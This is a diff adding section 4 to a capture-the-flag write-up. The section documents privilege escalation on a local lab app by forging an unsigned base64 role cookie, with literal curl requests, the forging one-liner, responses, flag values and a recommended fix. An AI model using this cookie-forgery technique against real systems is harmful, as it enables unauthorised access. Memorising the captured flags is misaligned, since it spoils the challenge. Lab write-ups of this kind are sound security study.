@@ -17,7 +17,8 @@ the id, then a dash character, then the title (`messages.html:6`,
 Those are evidence, and altering them would make the record inaccurate, so they
 are preserved as received. No em dash appears in the prose of this file.
 
-Status: 3 of 6 captured (sqli, idor, xss). The other three are not yet worked.
+Status: 4 of 6 captured (sqli, idor, xss, authz). The other two are not yet
+worked.
 
 ---
 
@@ -631,6 +632,222 @@ FLAG{idor_c143bbc0c939}  VALID (idor)
 FLAG{xss_bef03a753643}  VALID (xss)
 
 3/6 flags valid for username s_hart
+```
+
+No entry was made in `attempts.md`: the challenge was captured on the first
+attempt.
+
+---
+
+## 4. authz: privilege escalation by cookie forgery at `GET /vault`
+
+**Flag:** `FLAG{authz_5e08dfcda13b}`
+**Captured:** 2026-09-29
+**Verified:** `verify.py` exit 1 with `4/6 valid` and the line
+`FLAG{authz_5e08dfcda13b}  VALID (authz)`. Exit 1 is expected while two
+challenges remain.
+
+### The vulnerability
+
+Access to `/vault` is decided by one comparison against a value that arrives
+from the client:
+
+```python
+if user.get("role") != "superadmin":        # app.py:314
+```
+
+`user` is built by `current_user()` from the `auth` cookie
+(`app.py:187` to `app.py:195`). The cookie's value is
+`base64("<username>:<role>")` (`app.py:182` to `app.py:184`), and the server
+performs no signature check on it, so there is nothing tying the role to
+anything the server issued. The role is simply a field in a client-held string,
+and the client can write whatever it likes there.
+
+The contrast with a signed cookie is the whole point: with a MAC (Flask's own
+`itsdangerous` session, for instance) a modified value fails validation and the
+server rejects it. Here there is no validation step at all, so a tampered cookie
+is indistinguishable from an issued one.
+
+Two facts from the source confirm that forging is the intended route rather than
+guessing credentials:
+
+- No login can produce this role. `set_auth` is called only from the login
+  handler (`app.py:223`), and the role it writes comes from the database row,
+  where every seeded user is `admin` or `user` (`app.py:136` to `app.py:139`).
+  `app.py:312` to `app.py:313` states in a comment that no normal login ever
+  issues `superadmin`.
+- Guessing is blocked by design. The admin password is regenerated per process
+  (`app.py:75`), so the login bypass from section 1 is a separate finding and
+  not a step here. This PoC never touches the admin account.
+
+### Step 1: obtain a real issued cookie
+
+The starting point is an ordinary login, so that the PoC shows a genuine cookie
+being altered rather than a fabricated one being invented from nothing. Literal
+request:
+
+```
+curl -s -i -c alice2.txt -X POST http://127.0.0.1:5000/login \
+  --data-urlencode "username=alice" \
+  --data-urlencode "password=password123"
+```
+
+Response header:
+
+```
+HTTP/1.1 302 FOUND
+Set-Cookie: auth=YWxpY2U6dXNlcg==; Path=/
+```
+
+The issued cookie, and its meaning:
+
+```
+before: YWxpY2U6dXNlcg==  ->  alice:user
+```
+
+### Step 2: confirm the issued cookie is refused
+
+Literal request:
+
+```
+curl -s -o v_real.html -w "http_code=%{http_code}\n" -b alice2.txt \
+  http://127.0.0.1:5000/vault
+```
+
+`http_code=403`. Literal response, main block:
+
+```
+  <main>
+
+<h1>The Vault</h1>
+
+  <p class="error">403 — superadmins only.</p>
+  <p class="hint">You are signed in as <strong>alice</strong>
+  (role: <strong>user</strong>). The app decides your role from the
+  <code>auth</code> cookie it handed you. How is that cookie built?</p>
+
+  </main>
+```
+
+The page reports the role it decoded, `user`, taken from the cookie. The
+refusal is `app.py:315`.
+
+### Step 3: forge, changing only the role
+
+The username is left exactly as issued and only the role is replaced:
+
+```
+before: alice:user         ->  YWxpY2U6dXNlcg==
+after : alice:superadmin   ->  YWxpY2U6c3VwZXJhZG1pbg==
+```
+
+New value produced with:
+
+```
+printf 'alice:superadmin' | base64
+```
+
+There is no signature to invalidate, so no other step is required. Literal
+request:
+
+```
+curl -s -o v_forged.html -w "http_code=%{http_code}\n" \
+  -H "Cookie: auth=YWxpY2U6c3VwZXJhZG1pbg==" \
+  http://127.0.0.1:5000/vault
+```
+
+`http_code=200`. Literal response, main block:
+
+```
+  <main>
+
+<h1>The Vault</h1>
+
+  <p>Access granted, superadmin.</p>
+  <p class="note">FLAG{authz_5e08dfcda13b}</p>
+
+  </main>
+```
+
+The flag is emitted by `vault.html:6`, which renders only on the granted branch
+(`app.py:316`).
+
+### Cookie before and after
+
+| | Cookie value | Decoded | HTTP at `/vault` | Outcome |
+|---|---|---|---|---|
+| As issued | `YWxpY2U6dXNlcg==` | `alice:user` | `403` | refused |
+| Forged | `YWxpY2U6c3VwZXJhZG1pbg==` | `alice:superadmin` | `200` | flag returned |
+
+The username component is byte-identical across the two. The only change is the
+ten characters `superadmin` in place of the four `user`.
+
+### Controls run alongside the exploit
+
+| Request | Result | What it establishes |
+|---|---|---|
+| `auth` = `alice:admin` | `403` | the check is the literal string `superadmin`, not a notion of privilege. `admin` is the highest role that exists in the database (`app.py:136`) and it is still refused |
+| `GET /dashboard` with `auth` = `alice:superadmin` | `200`, shows `Signed in as alice (role: superadmin)` and the note `Remember to water the plants.` | the username half is a genuine account behaving normally. Only the role was altered, and the server accepted the mix without complaint |
+| `auth` = `ghost:superadmin` | `200` with the flag | decisive: see below |
+
+The third control is the strongest single piece of evidence. `ghost` is not a
+user. Requesting `/dashboard` with that cookie returns the `app.py:237` fallback:
+
+```
+<p>Signed in as <strong>ghost</strong> (role: superadmin).</p>
+  <p>(no note on file)</p>
+```
+
+`(no note on file)` is the branch taken when the username lookup returns no row,
+so the users table contains no `ghost`. The same cookie nevertheless opens
+`/vault`. A username that does not exist cannot hold any role in the database,
+and yet the vault grants access. That shows `/vault` never consults the database
+at all: it reads the role straight out of the cookie and compares the string.
+
+The second control is worth keeping in the report for a different reason. It
+shows the two halves of the cookie are trusted independently and inconsistently:
+`/dashboard` uses the username as a database key, so a forged username there
+merely finds nothing, while `/vault` uses the role as an authorization decision.
+Only the second use is a vulnerability.
+
+### Notes and limits
+
+- No login for `alice` beyond the initial credential exchange was needed, and the
+  admin account was never touched. The forged cookie was used directly as a
+  header, which is what an attacker with any ability to set a cookie would do.
+- The cookie is not signed, so nothing in this PoC depended on timing, guessing,
+  or a weak secret. The only requirement is the ability to send a header.
+- Restarting the app does not change the outcome, because the cookie format and
+  the role string are constants in the source (`app.py:182`, `app.py:314`) rather
+  than derived from `FLAG_SEED` or the random admin password. The flag itself is
+  stable across restarts because it derives from `FLAG_SEED` (`app.py:62` to
+  `app.py:67`).
+- The fix is not to hide or rename the role. It is to make the cookie
+  tamper-evident, by signing it with a server-side key (`app.py:77` constructs
+  the app with no `secret_key`), or to stop storing authorization state on the
+  client at all. Recording that here because the report should state what the
+  missing control is, not only that the check failed.
+- The value of `FLAG_SEED` used was `s_hart`, and the flag was accepted by
+  `verify.py` for `--username s_hart`.
+
+### Result
+
+Appended to `submission.txt`:
+
+```
+FLAG{authz_5e08dfcda13b}
+```
+
+Verifier output:
+
+```
+verify: 4/6 valid. Still missing: traversal, exposure
+FLAG{sqli_0883918f1b72}  VALID (sqli)
+FLAG{idor_c143bbc0c939}  VALID (idor)
+FLAG{xss_bef03a753643}  VALID (xss)
+FLAG{authz_5e08dfcda13b}  VALID (authz)
+
+4/6 flags valid for username s_hart
 ```
 
 No entry was made in `attempts.md`: the challenge was captured on the first
